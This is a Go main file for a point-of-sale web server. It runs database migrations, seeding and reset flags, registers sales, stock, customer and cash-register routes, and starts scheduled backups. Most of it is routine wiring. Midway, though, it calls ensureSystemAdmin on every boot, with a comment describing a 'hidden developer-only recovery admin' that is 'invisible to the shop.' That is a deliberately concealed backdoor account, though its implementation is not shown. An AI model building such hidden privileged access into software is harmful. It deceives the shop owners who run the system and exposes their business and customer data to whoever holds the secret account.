package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
	_ "time/tzdata" // embed the timezone database so local-time formatting works on any host

	"karots-pos/internal/backup"
	"karots-pos/internal/config"
	"karots-pos/internal/db"
	"karots-pos/internal/features/audit"
	"karots-pos/internal/features/auth"
	"karots-pos/internal/features/cashflow"
	"karots-pos/internal/features/cashregister"
	"karots-pos/internal/features/categories"
	"karots-pos/internal/features/conversions"
	"karots-pos/internal/features/customers"
	"karots-pos/internal/features/denominations"
	"karots-pos/internal/features/expenses"
	"karots-pos/internal/features/heldsales"
	"karots-pos/internal/features/products"
	"karots-pos/internal/features/purchasereturns"
	"karots-pos/internal/features/purchases"
	"karots-pos/internal/features/reports"
	"karots-pos/internal/features/sales"
	"karots-pos/internal/features/settings"
	"karots-pos/internal/features/stock"
	"karots-pos/internal/features/suppliers"
	"karots-pos/internal/features/units"
	appmw "karots-pos/internal/middleware"
	"karots-pos/internal/plugin"
	"karots-pos/internal/validator"
	"karots-pos/internal/web"
	"karots-pos/migrations"
	poststatic "karots-pos/static"

	"github.com/labstack/echo/v4"
	echomw "github.com/labstack/echo/v4/middleware"
)

func main() {
	migrateOnly := flag.Bool("migrate", false, "run migrations and exit")
	seedOnly := flag.Bool("seed", false, "seed development/demo data and exit")
	demoOnly := flag.Bool("demo", false, "seed entities + sample transactions (purchases, sales, expenses…) and exit")
	initOnly := flag.Bool("init", false, "create the initial admin account for a fresh shop and exit")
	resetFlag := flag.Bool("reset", false, "drop ALL data and re-run migrations (optionally combine with -seed/-demo)")
	forceFlag := flag.Bool("force", false, "allow -reset against a production database")
	flag.Parse()

	cfg := config.Load()

	sqlxDB, err := db.Connect(cfg.DatabaseURL)
	if err != nil {
		log.Fatal(err)
	}
	defer sqlxDB.Close()

	// Destructive wipe: drop the schema BEFORE migrating so the migration runner
	// rebuilds it (and its seeded reference data) from scratch.
	if *resetFlag {
		if cfg.IsProd() && !*forceFlag {
			log.Fatal("refusing -reset on a production database; pass -force to override")
		}
		log.Println("reset: dropping all data…")
		if err := resetSchema(sqlxDB); err != nil {
			log.Fatal(err)
		}
	}

	if err := db.RunMigrations(sqlxDB.DB, migrations.FS); err != nil {
		log.Fatal(err)
	}
	// Per-plugin migrations: each enabled plugin (see enabled_plugins.go) owns its
	// own goose version table, so this applies only that plugin's pending
	// migrations onto the existing schema — the late-enable path (buy a plugin
	// after go-live → migrate in + backfill, never a wipe). Idempotent; runs on
	// every boot, including -migrate and after -reset.
	for _, p := range plugin.All() {
		pfs, suffix := p.Migrations()
		if pfs == nil || suffix == "" {
			continue
		}
		if err := db.RunMigrationsTable(sqlxDB.DB, pfs, "goose_db_version_"+suffix); err != nil {
			log.Fatalf("plugin %q migrations: %v", p.Name(), err)
		}
		log.Printf("plugin %q: migrations applied (goose_db_version_%s)", p.Name(), suffix)
	}
	if *migrateOnly {
		log.Println("migrations applied")
		return
	}
	// -reset on its own leaves a clean, empty migrated database; combined with
	// -seed/-demo it falls through to those blocks to repopulate it.
	if *resetFlag && !*seedOnly && !*demoOnly {
		log.Println("reset complete: empty migrated database")
		return
	}
	if *seedOnly {
		if err := seed(sqlxDB); err != nil {
			log.Fatal(err)
		}
		log.Println("seed complete")
		return
	}
	if *demoOnly {
		if err := demo(sqlxDB); err != nil {
			log.Fatal(err)
		}
		log.Println("demo seed complete")
		return
	}
	if *initOnly {
		if err := initShop(sqlxDB); err != nil {
			log.Fatal(err)
		}
		return
	}

	// Hidden developer-only recovery admin — re-ensured on every boot so the
	// install can always be unlocked. Invisible to the shop.
	if err := ensureSystemAdmin(sqlxDB); err != nil {
		log.Fatal(err)
	}

	e := echo.New()
	e.HideBanner = true
	e.Validator = validator.New()
	e.HTTPErrorHandler = appmw.ErrorHandler(cfg.IsProd())

	e.Use(echomw.Recover())
	e.Use(echomw.Logger())
	e.Use(echomw.CORSWithConfig(echomw.CORSConfig{AllowOrigins: cfg.CORSOrigins}))
	// Static assets are embedded in the binary (see internal package `static`),
	// so no on-disk static/ directory is needed at runtime.
	e.GET("/static/*", echo.WrapHandler(http.StripPrefix("/static/", http.FileServer(http.FS(poststatic.Files)))))

	// Liveness probe for deployments: 200 only when the DB answers a ping.
	e.GET("/health", func(c echo.Context) error {
		if err := sqlxDB.PingContext(c.Request().Context()); err != nil {
			return c.JSON(http.StatusServiceUnavailable, map[string]string{"status": "down", "db": "unreachable"})
		}
		return c.JSON(http.StatusOK, map[string]string{"status": "ok"})
	})

	// API routes (JSON)
	authSvc := auth.RegisterAPI(e, sqlxDB, cfg, auth.NewLoginLimiter())
	settings.RegisterAPI(e, sqlxDB, cfg)
	categories.RegisterAPI(e, sqlxDB, cfg)
	units.RegisterAPI(e, sqlxDB, cfg)
	conversions.RegisterAPI(e, sqlxDB, cfg)
	products.RegisterAPI(e, sqlxDB, cfg)
	stock.RegisterAPI(e, sqlxDB, cfg)
	customers.RegisterAPI(e, sqlxDB, cfg)
	suppliers.RegisterAPI(e, sqlxDB, cfg)
	purchases.RegisterAPI(e, sqlxDB, cfg)
	purchasereturns.RegisterAPI(e, sqlxDB, cfg)
	expenses.RegisterAPI(e, sqlxDB, cfg)
	reports.RegisterAPI(e, sqlxDB, cfg)
	sales.RegisterAPI(e, sqlxDB, cfg)
	denominations.RegisterAPI(e, sqlxDB, cfg)
	heldsales.RegisterAPI(e, sqlxDB, cfg)
	crSvc := cashregister.RegisterAPI(e, sqlxDB, cfg, sales.NewService(sqlxDB), audit.NewService(sqlxDB))
	// Wire the locker side of till cash events (opening float from a locker,
	// banking at close, mid-shift moves to/from a locker) through cashflow, which
	// imports cashregister — so the hook is injected here rather than imported.
	crSvc.WithLockerLeg(cashflow.NewService(sqlxDB, sales.NewService(sqlxDB)).TillLockerLeg)

	// UI routes (HTMX + Templ)
	web.RegisterUI(e, sqlxDB, cfg, authSvc)

	// Background context cancelled on shutdown so long-lived workers stop cleanly.
	bgCtx, bgCancel := context.WithCancel(context.Background())
	defer bgCancel()

	// Automatic time-based backups (in-process, same pure-Go path as the manual
	// Settings backup). Disabled unless BACKUP_DIR is set.
	if cfg.BackupDir != "" {
		log.Printf("auto-backup: enabled (dir=%s, every %s, keep %d)", cfg.BackupDir, cfg.BackupInterval, cfg.BackupKeep)
		go backup.RunScheduler(bgCtx, sqlxDB, cfg.BackupDir, cfg.BackupInterval, cfg.BackupKeep)
	} else {
		log.Printf("auto-backup: disabled (set BACKUP_DIR to enable)")
	}

	// Start with graceful shutdown.
	go func() {
		addr := fmt.Sprintf(":%d", cfg.ServerPort)
		log.Printf("POS server listening on %s (env=%s)", addr, cfg.Env)
		if err := e.Start(addr); err != nil && !errors.Is(err, http.ErrServerClosed) {
			log.Fatalf("server error: %v", err)
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit
	log.Println("shutting down…")
	bgCancel()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := e.Shutdown(ctx); err != nil {
		log.Fatalf("forced shutdown: %v", err)
	}
}
